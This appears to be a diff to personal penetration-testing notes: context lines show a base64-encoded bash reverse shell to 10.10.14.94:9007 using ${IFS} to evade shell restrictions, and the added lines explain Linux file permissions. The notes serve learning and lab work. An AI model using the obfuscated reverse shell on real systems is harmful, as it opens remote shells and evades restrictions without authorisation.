@@ -20,3 +20,29 @@ https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restric
 ```echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NC85MDA3IDA+JjE|base64${IFS}-d|bash${IFS}-;```<br>
 it means the highlighted part below is base64 encoded to bypass shell restriction<br>
 echo${IFS}**bash -i >& /dev/tcp/10.10.14.94/9007 0>&1**|base64${IFS}-d|bash${IFS}-;<br>
+**Understanding Linux File and directory permissions**<br>
+d 	r 	w 	x 	r 	w 	x 	r 	w 	x <br>
+Dir	    Owner 	   Group 	       Other <br>
+Directory 	Read 	Write 	Execute 	Read 	Write 	Execute 	Read 	Write 	Execute <br>
+
+If any of these letters is replaced with a hyphen (-), it means that permission is not granted.For example <br>
+drwxr-xr-x<br>
+    A folder which has read, write and execute permissions for the owner, but only read and execute permissions for the group and exe for other users.<br>
+-rw-rw-rw-<br>
+    A file that can be read and written by anyone, but not executed at all.<br>
+    
+    
+**Understanding Linux File and directory permissions Using Numbers**<br>
+No (R) 	 (W) 	(X)<br>
+0 	          No 	   No 	           No<br>
+1 	          No     No 	           Yes<br>
+2 	          No 	   Yes 	            No<br>
+3 	          No 	   Yes 	           Yes<br>
+4 	          Yes 	  No 	            No<br>
+5 	          Yes 	  No 	            Yes<br>
+6 	          Yes 	  Yes 	           No<br>
+7 	          Yes    	Yes 	          Yes<br>
+
+777 is the same as rwxrwxrwx<br>
+
+755 is the same as rwxr-xr-x<br>
